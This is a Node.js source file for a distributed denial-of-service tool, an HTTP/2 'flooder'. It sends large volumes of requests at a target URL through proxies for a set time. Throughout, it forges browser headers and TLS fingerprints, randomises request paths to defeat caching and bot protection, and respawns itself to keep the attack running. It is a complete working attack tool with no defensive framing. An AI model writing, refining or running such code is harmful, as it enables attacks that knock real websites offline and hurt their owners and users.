
const url = require('url')
, fs = require('fs')
, http2 = require('http2')
, http = require('http')
, tls = require('tls')
, net = require('net')
, request = require('request')
, cluster = require('cluster')

try {
    randReferer = require('random-referer')
} catch(e) {
    console.log('Installing random-referer...');
    require('child_process').execSync('npm i random-referer')
    randReferer = require('random-referer')
}

const ua = require('user-agents');
const crypto = require('crypto');
const os = require("os");
const UAParser = require('ua-parser-js'); // npm install ua-parser-js

const currentTime = new Date();
const httpTime = currentTime.toUTCString();

const errorHandler = error => { console.log(error); };
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

try {
    let colors = require('colors');
} catch (err) {
    console.log('\\x1b[36mInstalling\\x1b[37m the requirements');
    require('child_process').execSync('npm install colors ua-parser-js');
    console.log('Done.');
    process.exit();
}

cplist = [
    'TLS_AES_128_CCM_8_SHA256',
    'TLS_AES_128_CCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_AES_128_GCM_SHA256'
];

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512",
];

let concu = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

const headerFunc = {
    cipher() { return cplist[Math.floor(Math.random() * cplist.length)]; },
    sigalgs() { return sigalgs[Math.floor(Math.random() * sigalgs.length)]; },
}

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

function randomIp() {
    const segment1 = Math.floor(Math.random() * 256);
    const segment2 = Math.floor(Math.random() * 256);
    const segment3 = Math.floor(Math.random() * 256);
    const segment4 = Math.floor(Math.random() * 256);
    return `${segment1}.${segment2}.${segment3}.${segment4}`;
}

const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () =>
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
let proxyFile = process.argv[5];
const rps = process.argv[6];

let parsed = url.parse(target);
let input = 'bypass';
let query = 'false';

// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
    console.log("Bixd")
    process.exit(1);
}

/*if (!/^https?:///i.test(target)) {
    console.error('sent with http:// or https://');
    process.exit(1);
}*/

proxyr = proxyFile

if (isNaN(rps) || rps <= 0) {
    console.error('number rps');
    process.exit(1);
}

const searchEngines = [
    'https://www.google.com',
    'https://www.bing.com',
    'https://search.yahoo.com',
    'https://www.duckduckgo.com',
    'https://www.baidu.com',
    'https://www.yandex.com',
    'https://www.ecosia.org',
    'https://www.qwant.com',
    'https://www.startpage.com',
    'https://www.ask.com'
];

const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];

const argsa = process.argv.slice(2);
const queryIndexa = argsa.indexOf('--post');
post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;

const argsb = process.argv.slice(2);
const queryIndexg = argsb.indexOf('--query');
query = queryIndexg !== -1 ? argsb[queryIndexg + 1] : null;

const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--status');
tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;

const argstco = process.argv.slice(2);
const queryIndextco = argstco.indexOf('--cookie');
cookies = queryIndextco !== -1 ? argstco[queryIndextco + 1] : null;

let cookie
if (cookies === 'true') {
    cookie = process.argv[7] + "; " + generateRandomString(5,10) + "=$#" + generateRandomString(300,500)
} else {
    cookie = process.argv[7]
}

let method, path;

if (parsed.path.includes('%rand%')) {
    pathl = parsed.path.replace("/%rand%", generateRandomString(5, 7))
    if (query === 'true') {
        path = pathl + "/" + generateRandomString(5, 10) + (Math.random() < 0.5 ? "?" + generateRandomString(5, 10) : "")
    } else if (query === "query") {
        path = pathl + "?s=" + generateRandomString(5, 10)
    } else {
        path = pathl
    }
} else {
    pathl = parsed.path
    if (query === 'true') {
        path = pathl + "/" + generateRandomString(5, 10) + (Math.random() < 0.5 ? "?" + generateRandomString(5, 10) : "")
    } else if (query === "query") {
        path = pathl + "?s=" + generateRandomString(5, 10)
    } else {
        path = pathl
    }
}

if (post === 'true') {
    method = {
        ":method": "POST",
        "content-length": "0"
    };
} else if (post === 'random') {
    const httpMethods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE'];
    method = {
        ":method": httpMethods[Math.floor(Math.random() * httpMethods.length)],
    }
} else {
    method = {
        ":method": "GET",
    }
}

const statusCounts = {};
const countStatus = (status) => {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
};

const validkey = generateRandomString(5, 10);

const printStatusCounts = () => {
    console.log(statusCounts);
    Object.keys(statusCounts).forEach(status => { statusCounts[status] = 0; });
};

function response(res) {
    const status = res[':status']
    countStatus(status)
}

if (tos === 'true') {
    setInterval(printStatusCounts, 3000);
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


function parseUserAgent(uaString) {
    const parser = new UAParser(uaString);
    const result = parser.getResult();
    
    return {
        browser: {
            name: result.browser.name || 'Unknown',
            version: result.browser.version || '0',
            full: `${result.browser.name} ${result.browser.version}`.trim()
        },
        engine: {
            name: result.engine.name || 'Unknown',
            version: result.engine.version || '0'
        },
        os: {
            name: result.os.name || 'Unknown',
            version: result.os.version || '0',
            full: `${result.os.name} ${result.os.version}`.trim()
        },
        device: {
            type: result.device.type || 'desktop',
            model: result.device.model || 'Generic',
            vendor: result.device.vendor || 'Generic'
        },
        cpu: {
            architecture: result.cpu.architecture || '64'
        },
        isMobile: result.device.type === 'mobile',
        isDesktop: result.device.type === 'desktop' || !result.device.type,
        isBot: result.browser.name?.toLowerCase().includes('bot')
    };
}


function generateUAHeaders(parsedUA) {
    const { browser, os, engine, device, cpu, isMobile, isDesktop } = parsedUA;
    
    const browserHeaders = {
        'sec-ch-ua': `"${browser.name}";v="${browser.version.split('.')[0] || '99'}", "Not)A;Brand";v="99", "Chromium";v="${browser.version.split('.')[0] || '99'}"`,
        'sec-ch-ua-mobile': isMobile ? '?1' : '?0',
        'sec-ch-ua-platform': `"${os.name}"`
    };
    
    const osHeaders = {};
    if (os.name.toLowerCase().includes('windows')) {
        osHeaders['sec-ch-ua-platform-version'] = `"${os.version}.0"`;
    } else if (os.name.toLowerCase().includes('mac')) {
        osHeaders['sec-ch-ua-platform-version'] = `"${os.version.split('.')[0] || '10'}"`;
    } else if (os.name.toLowerCase().includes('linux')) {
        osHeaders['sec-ch-ua-platform-version'] = `"${os.version || '0'}"`;
    }
    
    const deviceHeaders = {
        ...(isMobile && {
            'x-requested-with': 'XMLHttpRequest',
            'viewport-width': '375'
        }),
        ...(isDesktop && {
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1'
        })
    };
    
    const cpuHeaders = {
        'sec-ch-cpu-class': cpu.architecture === '64' ? 'x86-64' : 'x86-32'
    };
    
    return {
        ...browserHeaders,
        ...osHeaders,
        ...deviceHeaders,
        ...cpuHeaders,
        'upgrade-insecure-requests': '1',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br'
    };
}

function flood(proxy) {
    let parsed = url.parse(target);
    let sigals = headerFunc.sigalgs();
    let interval

    
    const userAgent = process.argv[8] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36';
    const parsedUA = parseUserAgent(userAgent);

    if (input === 'flood') {
        interval = 1000;
    } else if (input === 'bypass') {
        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        interval = randomDelay(100, 1000);
    } else {
        interval = 1000;
    }

    function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({ length }, () => {
            const randomIndex = Math.floor(Math.random() * characters.length);
            return characters[randomIndex];
        });
        return randomStringArray.join('');
    }

    function getRandomFileExtension() {
        const extensions = ['.php', '.js', '.css', '.html', '.json', '.xml'];
        return extensions[Math.floor(Math.random() * extensions.length)];
    }

    const nodeii = getRandomInt(134, 135);

    
    let header = {
        ...method,
        ":authority": parsed.host,
        ":scheme": 'https',
        "Referer": randomEngine,
        ":path": path,
        "user-agent": userAgent,
        ...generateUAHeaders(parsedUA) 
    };

    let dynHeaders = {
        "Authorization": cookie,
        "cookie": cookie,
        ...generateUAHeaders(parsedUA),
        "cache-control": "no-cache, no-store, must-revalidate",
        "pragma": "no-cache",
        "sec-fetch-site": "same-origin"
    };

    // Chỉ thêm random headers với probability thấp
    if (Math.random() < 0.1) {
        Object.assign(dynHeaders, {
            [`ua-fingerprint-${generateRandomString(2,4)}`]: parsedUA.browser.full,
            [`device-id-${generateRandomString(2,4)}`]: parsedUA.device.model,
            [`os-info-${generateRandomString(2,3)}`]: parsedUA.os.full
        });
    }

    let head
    if (Math.random() >= 0.5) {
        head = { ...header, ...dynHeaders };
    } else {
        head = { ...header, ...dynHeaders };
    }

    const sendRequest = async (client, retries = 3) => {
        try {
            const request = client.request(head, {
                endStream: false,
                weight: 256,
                depends_on: 0,
                exclusive: false,
            });

            if (tos === 'true') {
                request.on('response', (res) => { response(res); });
            }

            request.end();
            await new Promise((resolve, reject) => {
                request.on('end', resolve);
                request.on('error', reject);
            });
        } catch (error) {
            console.error('Request failed:', error);
            if (retries > 0) {
                console.log('Retrying request...');
                await sendRequest(client, retries - 1);
            }
        }
    };

    // Proxy parsing
    const regexPattern = /^([w.-]+):(w+)@([w.-]+):(d+)$/;
    const match = proxy.match(regexPattern);

    if (match) {
        const agent = new http.Agent({
            host: match[3],
            port: match[4],
            keepAlive: true,
            keepAliveMsecs: 1000000, // Tối ưu
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxFreeSockets: 10000
        });

        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.host + ':443',
            timeout: 1000,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
                'Proxy-Authorization': 'Basic ' + Buffer.from(`${match[1]}:${match[2]}`).toString('base64')
            },
        };

        connection = http.request(Optionsreq, (res) => {});
    } else {
        proxy = process.argv[5].split(":");
        const agent = new http.Agent({
            host: proxy[0],
            port: proxy[1],
            keepAlive: true,
            keepAliveMsecs: 1000000,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
        });

        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.host + ':443',
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
        };
        connection = http.request(Optionsreq, (res) => {});
    }

    const TLSOPTION = {
        ciphers: cplist.join(':'),
        //secureProtocol: ["TLSv1_3_method"],
        minVersion: 'TLSv1.3',   // Thay secureProtocol (deprecated)
        maxVersion: 'TLSv1.3',
    sigalgs: Math.random() < 0.5 ? sigals : concu,
    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
    ecdhCurve: Math.random() < 0.5 ? "X25519:secp256r1:secp521r1:secp384r1" : "X25519",
    //                                                        ^^^^ secp521r1 (không phải secp512r1)
    secure: true,
    rejectUnauthorized: false,
    ALPNProtocols: Math.random() < 0.5 ? ['h2'] : ['h2', 'http/1.1'],

   //     sigalgs: Math.random() < 0.5 ? sigals : concu,
   //     secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
   //     ecdhCurve: Math.random() < 0.5 ? "X25519:secp256r1:secp512r1:secp384r1" : "X25519",
   //     secure: true,
   //     rejectUnauthorized: false,
   //     ALPNProtocols: Math.random() < 0.5 ? ['h2'] : ['h2', 'http1/1'],
    };

    function createCustomTLSSocket(parsed, socket) {
        const tlsSocket = tls.connect({
            ...TLSOPTION,
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            socket: socket
        });

        tlsSocket.setKeepAlive(true, 600000 * 1000);
        return tlsSocket;
    }

    connection.on('connect', async function(res, socket) {
        socket.setKeepAlive(true, 100000);
        const tlsSocket = createCustomTLSSocket(parsed, socket)

        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 4096,
                enablePush: false,
                initialWindowSize: 2147483647,
                maxHeaderListSize: 65535,
                maxFrameSize: 16777215,
                enableConnectProtocol: false
            },
        }, (session) => {
            session.setLocalWindowSize(2147483647);
//            session.setRemoteWindowSize(2147483647);
        });

        client.on("connect", () => {
            clearr = setInterval(async () => {
                for (let i = 0; i < rps; i++) {
                    sendRequest(client);
                }
            }, interval);
        });

        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            socket.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            tlsSocket.destroy();
            socket.destroy();
            return
        });
    });

    connection.on('error', (error) => {
        connection.destroy();
        if (error) return;
    });

    connection.on('timeout', () => {
        connection.destroy();
        return
    });

    connection.end();
}

let intervalId;
let intervalId2;

const valid = () => setInterval(function() {
    flood(proxyr);
}, 10);

intervalId = valid();
intervalId2 = valid();

setInterval(() => {
    clearInterval(intervalId);
    clearInterval(intervalId2);
    intervalId = valid();
    intervalId2 = valid();
}, 10000);

const { spawn } = require('child_process');
const { ref } = require('process');

const MAX_RAM_PERCENTAGE = 40;

function Seconds() {
    const currentTime = Date.now();
    const elapsedTimeInSeconds = Math.floor((currentTime - startTime) / 1000);
    const remainingSeconds = Math.max(time - elapsedTimeInSeconds, 0);
    return remainingSeconds;
}

const startTime = Date.now();

const restartScript = (timereset) => {
    process.argv[3] = timereset
    const child = spawn(process.argv[0], process.argv.slice(1), {
        detached: true,
        stdio: 'ignore'
    });
    child.unref();
    process.exit();
};

const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    const endtime = Seconds()

    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        restartScript(endtime);
    }
};

const Script = () => {
    const child = spawn('pkill', ['-f', validkey]);
    child.on('close', (code, signal) => {
        console.log(`Child process terminated with code ${code} and signal ${signal}`);
        process.exit();
    });
};

process.on('SIGINT', () => {
    console.log('Received SIGINT. Exiting...');
    Script();
    process.exit(0);
});

setInterval(handleRAMUsage, 1000);

console.log(`Flooder Browser Stared with proxies: ${proxyFile}`);
setTimeout(function() {
    console.log("Attack stopped.");
    Script();
    process.exit(1);
}, time * 1000);
